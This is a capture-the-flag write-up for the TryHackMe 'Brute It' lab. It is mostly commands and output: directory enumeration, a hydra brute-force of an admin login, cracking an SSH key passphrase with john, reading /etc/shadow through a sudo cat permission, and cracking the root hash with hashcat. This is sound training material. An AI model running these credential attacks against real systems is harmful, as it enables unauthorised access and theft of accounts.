---
title: Brute It
description: Writeup for the TryHackMe machine Brute It
date: 2020-11-06
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds two open ports: SHH (22) and HTTP (80).
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

### HTTP - TCP 80

The root page displays the default Apache page.
I use `gobuster` to enumerate directories:
```console
$ gobuster dir -u "http://bruteit.thm/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404 -t 200 --timeout 40s -k
/admin                (Status: 301) [Size: 310] [--> http://bruteit.thm/admin/]
```
Navigating to `/admin/` reveals a login form. Viewing the page source uncovers a helpful comment:
```
Hey john, if you do not remember, the username is admin
```

## Shell as john

I use `hydra` to brute-force the `admin` password:
```console
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt bruteit.thm http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -V -F
[...]
[80][http-post-form] host: bruteit.thm   login: admin   password: <REDACTED>
```
The admin panel provides a link to download a private SSH key:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

<REDACTED>
-----END RSA PRIVATE KEY-----
```
The key is encrypted with a passphrase, which I brute-force using `john`:
```console
$ ssh2john id_rsa > hash_ssh.txt                          
$ john -w=/usr/share/wordlists/rockyou.txt hash_ssh.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>       (id_rsa)     
1g 0:00:00:00 DONE (2025-04-11 16:53) 7.692g/s 558769p/s 558769c/s 558769C/s saloni..rashon
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Using the recovered passphrase, I successfully connect via SSH as `john`.

## Shell as root

Once logged in as `john`, I check for `sudo` privileges:
```console
$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
Using this, I am able to read `/etc/shadow` and extract the root password hash:
```console
$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
[...]
```
I crack the hash using `hashcat`:
```console
$ hashcat -a 0 hash_root.txt /usr/share/wordlists/rockyou.txt
[...]
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:<REDACTED>
```
Finally, I switch to the `root` user.
